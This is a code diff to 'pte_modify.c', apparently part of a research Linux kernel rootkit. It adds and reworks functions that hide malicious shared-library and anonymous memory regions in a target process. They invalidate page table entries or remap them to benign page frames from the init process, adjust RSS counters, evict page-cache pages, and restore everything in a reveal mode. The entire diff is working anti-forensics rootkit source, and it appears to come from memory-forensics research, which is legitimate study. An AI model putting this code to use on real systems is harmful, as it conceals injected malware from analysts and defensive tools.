@@ -1,6 +1,8 @@
 /* pte_modify.c -- invalidating or remapping PTEs
  *
  * Copyright (C) 2019 Patrick Reichenberger
+ * Additional Authors:
+ * Frank Block, ERNW Research GmbH <fblock@ernw.de>
  *
  * This program is free software; you can redistribute it and/or modify
  * it under the terms of the GNU General Public License as published by
@@ -22,6 +24,7 @@
 #include "rootkit_module.h"
 #include "pte_helper.h"
 #include "pte_modify.h"
+#include "helper.h"
 #include "debug.h"
 
 
@@ -171,7 +174,7 @@ void pte_invalidate_handler(char *mal_lib_path, int pid, int mode) {
     for (int i = 0; i < sizeof(vma_rights_p) / sizeof(int); i++) {
         /* Find the specific VMA of the malicious library. */
 
-        mal_vma = find_vma_path_rights(mal_lib_path, vma_rights_p[i], pid);
+        mal_vma = find_vma_path_rights(0, mal_lib_path, vma_rights_p[i], pid);
         if (mal_vma) {
             for(va.value = mal_vma->vm_start; va.value < mal_vma->vm_end; va.value = va.value+4096) {
                  invalidate_restore_pte(pid, va, mode);
@@ -182,6 +185,31 @@ void pte_invalidate_handler(char *mal_lib_path, int pid, int mode) {
         }
     }
 }
+
+
+/** pte_invalidate_anon_handler - handles the technique of invalidating PTEs
+*  @mal_lib_path: path of malicious library VMAs
+*  @pid: PID
+*  @mode: hide or reveal
+*
+*  Determines the VMAs and pages therein that need to be deleted or restored.
+*
+*/
+void pte_invalidate_anon_handler(unsigned long long vm_start, int pid, int mode) {
+    struct vm_area_struct *mal_vma;
+    VIRT_ADDR va;
+
+    mal_vma = find_vma_with_start_address(vm_start, pid);
+    if (mal_vma) {
+        for(va.value = mal_vma->vm_start; va.value < mal_vma->vm_end; va.value = va.value+0x1000) {
+                invalidate_restore_pte(pid, va, mode);
+#ifdef MANUAL_MODE
+                modify_rss_stat_count(mal_vma->vm_mm, mal_vma->vm_flags, 0, mode);
+#endif
+        }
+    }
+}
+
 
 
 /* -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
@@ -201,7 +229,7 @@ void pte_invalidate_handler(char *mal_lib_path, int pid, int mode) {
  *  In manual mode, the Resident Set Size (RSS) of the process is adjusted, as this causes problems
  *  when closing the process and VMAs are deleted.
  */
-void remap_pte(struct vm_area_struct *mal_vma, struct vm_area_struct *benign_vma, int pid) {
+void remap_pte(struct vm_area_struct *mal_vma, struct vm_area_struct *benign_vma, int pid, MemoryMode mem_mode) {
     VIRT_ADDR mal_va;
     VIRT_ADDR benign_va;
     PTE *mal_pte;
@@ -237,13 +265,17 @@ void remap_pte(struct vm_area_struct *mal_vma, struct vm_area_struct *benign_vma
             /* Store the PTE value in the backup list */
             if(!insert_ll_va_pte(mal_va, mal_pte)) {
 #ifdef MANUAL_MODE
-                modify_rss_stat_countpteremap(mal_vma->vm_mm, mal_vma->vm_flags, HIDE);
+                if (mem_mode == SHARED_LIB)
+                    modify_rss_stat_countpteremap(mal_vma->vm_mm, mal_vma->vm_flags, HIDE);
+                else
+                    modify_rss_stat_countpteremap_anon(mal_vma->vm_mm, HIDE, mem_mode);
 #endif
                 /* Delete the page from page cache */
                 own_delete_from_page_cache(mal_pte);
 
                 /* Change the PFN of the malicious PTE to the PFN of the benign PTE */
                 PHYS_ADDR target = (PHYS_ADDR) benign_pte->page_frame << 12;
+                log_print(LOG_INFO, "Remapping malicious virtual address %#016llx with PFN %#016llx to %#016llx with PFN %#016llx.", mal_va.pointer, mal_pte->page_frame, benign_va.pointer, benign_pte->page_frame);
                 remap_page(mal_va, target, pid);
 
                 /* Set the reserved flag so that the page frame is not reclaimed or swapped */
@@ -272,7 +304,7 @@ void remap_pte(struct vm_area_struct *mal_vma, struct vm_area_struct *benign_vma
  *  In manual mode, the Resident Set Size (RSS) of the process is adjusted, as it had to be
  *  changed when remapping the PTEs.
  */
-void reset_pte(struct vm_area_struct *mal_vma, int pid) {
+void reset_pte(struct vm_area_struct *mal_vma, int pid, MemoryMode mem_mode) {
     VIRT_ADDR mal_va;
     PTE *mal_pte;
 
@@ -301,7 +333,10 @@ void reset_pte(struct vm_area_struct *mal_vma, int pid) {
                 /* Determine malicious page struct */
                 struct page *malpage = get_pte_page(mal_pte);
 #ifdef MANUAL_MODE
-                modify_rss_stat_countpteremap(mal_vma->vm_mm, mal_vma->vm_flags, REVEAL);
+                if (mem_mode == SHARED_LIB)
+                    modify_rss_stat_countpteremap(mal_vma->vm_mm, mal_vma->vm_flags, REVEAL);
+                else
+                    modify_rss_stat_countpteremap_anon(mal_vma->vm_mm, REVEAL, mem_mode);
 #endif
                 /* Set the reserved flag so that the page frame is not reclaimed or swapped */
                 ClearPageReserved(malpage);
@@ -333,44 +368,106 @@ void reset_pte(struct vm_area_struct *mal_vma, int pid) {
 void pte_remap_handler(char *mal_lib_path, int pid, int mode) {
     struct vm_area_struct *mal_vma;
     struct vm_area_struct *ben_vma = 0;
+    struct vm_area_struct *mal_start_vma = NULL;
 
     if(!mode) {
         /* Remap the pages of the VMAs with the specified path. */
         for(int i = 0; i < sizeof(vma_rights_p)/sizeof(int); ++i) {
             /* Find the specific VMA of the malicious library. */
-            mal_vma = find_vma_path_rights(mal_lib_path, vma_rights_p[i], pid);
+            mal_vma = find_vma_path_rights(0, mal_lib_path, vma_rights_p[i], pid);
+            ben_vma = get_fitting_benign_vma(mal_vma, vma_rights_p[i]);
 
-            /* Find the first VMA in the init process address space that fits in size */
-            struct vm_area_struct *vma = find_vma_mmap(1);
-            while(vma) {
-                /* Benign VMA needs to fit in size, must be a file mapping and has the same access rights */
-                if(vma->vm_file && vma->vm_file->f_path.dentry && (vma->vm_flags & 0x7) == vma_rights_p[i]
-                   && mal_vma && (vma->vm_end - vma->vm_start) >= (mal_vma->vm_end - mal_vma->vm_start)) {
-                    log_print(LOG_INFO, "Found VMA is %s -- start %lx", vma->vm_file->f_path.dentry->d_name.name, vma->vm_start);
-                    ben_vma = vma;
-                    break;
+            mal_start_vma = mal_vma;
+            do {
+                /* Remap the pages */
+                if(mal_vma && ben_vma) {
+                    log_print(LOG_INFO, "Starting PTE remapping for malicious vma at: 0x%016lx.", mal_vma->vm_start);
+                    remap_pte(mal_vma, ben_vma, pid, SHARED_LIB);
+
                 }
-                vma = vma->vm_next;
-            }
-            /* Fallback if no fitting VMA is found. */
-            if(!ben_vma) {
-                ben_vma = find_vma_path_rights("systemd", vma_rights_p[i], 1);
-            }
+                mal_vma = find_vma_path_rights(mal_vma, mal_lib_path, vma_rights_p[i], pid);
+                ben_vma = get_fitting_benign_vma(mal_vma, vma_rights_p[i]);
+                if (mal_vma && !ben_vma){
+                    log_print(LOG_ERR, "No benign vma found for malicious vma at: 0x%016lx", mal_vma->vm_start);
+                }
+            } while (mal_vma != mal_start_vma && mal_vma != 0 && ben_vma != 0);
 
-            /* Remap the pages */
-            if(mal_vma && ben_vma) {
-                remap_pte(mal_vma, ben_vma, pid);
-            }
         }
     } else {
 
         /* Reset the pages of the VMAs */
         for(int i = 0; i < sizeof(vma_rights_p)/sizeof(int); ++i) {
             /* Find the specific VMAs of the malicious library. */
-            mal_vma = find_vma_path_rights(mal_lib_path, vma_rights_p[i], pid);
-            if(mal_vma) {
-                reset_pte(mal_vma, pid);
-            }
+            mal_vma = find_vma_path_rights(0, mal_lib_path, vma_rights_p[i], pid);
+            mal_start_vma = mal_vma;
+
+            do {
+                if(mal_vma) {
+                    reset_pte(mal_vma, pid, SHARED_LIB);
+                }
+                mal_vma = find_vma_path_rights(mal_vma, mal_lib_path, vma_rights_p[i], pid);
+            } while (mal_vma != mal_start_vma && mal_vma != 0);
+
         }
     }
+}
+
+void pte_remap_handler_anon(unsigned long long vm_start, int pid, int mode, MemoryMode mem_mode) {
+
+    struct vm_area_struct *mal_vma = 0;
+    struct vm_area_struct *ben_vma = 0;
+
+    mal_vma = find_vma_with_start_address(vm_start, pid);
+
+    if (!mal_vma){
+        log_print(LOG_ERR, "the malicious vma could not be found.");
+        return;
+    }
+
+    if(!mode) {
+        ben_vma = find_vma_with_size(mal_vma->vm_end - mal_vma->vm_start);
+        if (!ben_vma){
+            log_print(LOG_ERR, "No benign vma found for malicious vma at: 0x%016lx", mal_vma->vm_start);
+            return;
+        }
+
+        log_print(LOG_INFO, "Starting PTE remapping for malicious vma at: 0x%016lx with size 0x%lx.", mal_vma->vm_start, (mal_vma->vm_end - mal_vma->vm_start));
+        remap_pte(mal_vma, ben_vma, pid, mem_mode);
+
+    } else {
+        reset_pte(mal_vma, pid, mem_mode);
+    }
+
+}
+
+
+struct vm_area_struct *find_vma_with_size(unsigned long long size){
+    /* Find the first VMA in the init process address space that fits in size */
+    struct vm_area_struct *vma = find_vma_mmap(1);
+    while(vma) {
+        /* Benign VMA needs to fit in size */
+        if((vma->vm_end - vma->vm_start) >= size) {
+            log_print(LOG_INFO, "Found VMA with vm_start %lx", vma->vm_start);
+            return vma;
+        }
+        vma = vma->vm_next;
+    }
+    log_print(LOG_ERR, "No benign vma with a fitting size found.");
+    return NULL;
+}
+
+struct vm_area_struct *get_fitting_benign_vma(struct vm_area_struct *mal_vma, int rights){
+    /* Find the first VMA in the init process address space that fits in size */
+    struct vm_area_struct *vma = find_vma_mmap(1);
+    while(vma) {
+        /* Benign VMA needs to fit in size, must be a file mapping and has the same access rights */
+        if(vma->vm_file && vma->vm_file->f_path.dentry && (vma->vm_flags & 0x7) == rights
+            && mal_vma && (vma->vm_end - vma->vm_start) >= (mal_vma->vm_end - mal_vma->vm_start)) {
+            log_print(LOG_INFO, "Found VMA is %s -- start %lx", vma->vm_file->f_path.dentry->d_name.name, vma->vm_start);
+            return vma;
+        }
+        vma = vma->vm_next;
+    }
+    /* Fallback if no fitting VMA is found. */
+    return find_vma_path_rights(0, "systemd", rights, 1);
 }
